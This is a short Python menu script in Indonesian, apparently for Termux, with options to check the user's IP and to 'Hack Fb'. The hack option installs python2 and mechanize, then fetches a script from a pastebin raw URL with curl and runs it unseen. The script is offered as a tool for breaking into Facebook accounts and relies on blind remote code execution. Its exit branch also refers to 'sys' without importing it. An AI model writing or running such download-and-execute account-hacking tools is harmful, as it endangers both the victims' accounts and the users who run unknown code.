print("SELAMAT DATANG!!")
import requests, os

def cekip():
 print(f'[!] Mendapatkan IP..')
 re = requests.get('https://api.myip.com').json()
 ip = re['ip']
 print(f'[!] IP kamu : {ip}')
 
def hackfb():
 print(f'[!] Masuk..')
 os.system('pkg install python2')
 os.system('pkg install python2-dev')
 os.system('pip2 install mechanize')
 os.system('curl -S https://pastebin.com/raw/yUpg8zsv --output fb.py')
 os.system('python2 fb.py')


print('''-=[ S-TOOLS ]=-
 
      [Menu]
[1] Cek IP
[2] Hack Fb
[3] Keluar
''')
menu = input('[?] Silahkan pilih menu : ')

if menu == '1':
 cekip()
elif menu == '2':
 hackfb()
elif menu == '3':
 print('[?] SELAMAT TINGGAL')
 os.system('clear')
else:
 print('[?] Perintah tidak diketahui..')
 sys.exit